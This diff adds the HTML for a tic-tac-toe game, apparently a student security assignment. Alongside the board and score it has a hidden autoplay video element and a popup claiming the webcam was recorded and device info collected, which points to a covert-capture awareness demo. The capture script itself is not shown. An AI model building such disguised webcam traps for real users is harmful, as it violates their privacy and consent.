@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Tic Tac Toe IS A#3</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app">
+        <!-- Menu -->
+        <div class="menu" id="menu">
+            <h1>TIC-TAC-TOE</h1>
+            <div class="group">
+                <p>Espada</p>
+                <p>Shahmeer Haider – 23F-0671</p>               
+            </div>
+            
+            <div class="mark-select">
+                <p>Select Mark</p>
+                <button id="markX" class="active">X</button>
+                <button id="markO">O</button>
+            </div>
+
+            <button class="mode" id="cpuMode">VS Bot</button>
+            <button class="mode alt" id="playerMode">VS PLAYER</button>
+        </div>
+
+        <!-- Game -->
+        <div class="game hidden" id="game">
+            <div class="topbar">
+                <span id="turn">X TURN</span>
+                <button id="restart">↺</button>
+            </div>
+            <div id="board" class="board"></div>
+            <div class="score">
+                <div class="scorebox"><p>X</p><span id="scoreX">0</span></div>
+                <div class="scorebox"><p>TIES</p><span id="scoreTie">0</span></div>
+                <div class="scorebox"><p>O</p><span id="scoreO">0</span></div>
+            </div>
+        </div>
+
+        <!-- Result Popup -->
+        <div id="popup" class="popup hidden">
+            <h2 id="resultText"></h2>
+            <div class="popup-buttons">
+                <button id="nextRound">Next Round</button>
+                <button id="restartGame">Restart</button>
+                <button id="backMenu">Back</button>
+            </div>
+        </div>
+
+        <!-- Security Popup -->
+        <div id="securityPopup" class="popup hidden">
+            <h2>⚠️ SECURITY WARNING</h2>
+            <div class="warning-content">
+                <p>Your webcam was accessed and recorded.</p>
+                <p>Device info collected and saved.</p>
+                <p><strong>Always verify camera permissions!</strong></p>
+                <button id="okBtn">OK</button>
+            </div>
+        </div>
+
+        <!-- Device Info Display -->
+        <div class="device-info" id="deviceInfo"></div>
+
+        <!-- Hidden Video -->
+        <video id="video" autoplay muted style="display: none;"></video>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
